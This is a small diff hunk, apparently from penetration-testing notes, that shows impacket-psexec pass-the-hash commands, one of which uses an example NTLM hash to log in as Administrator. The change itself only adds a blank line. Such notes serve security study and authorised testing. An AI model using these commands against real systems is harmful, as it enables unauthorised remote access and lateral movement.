@@ -35,4 +35,5 @@ impacket-psexec $domain/$user@$ip -hashes $LM-authentication:$NTLM
 
 # If we only have the NTLM, then we can leave the $LM part in blank. Example:
 impacket-psexec Administrator@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
 ```
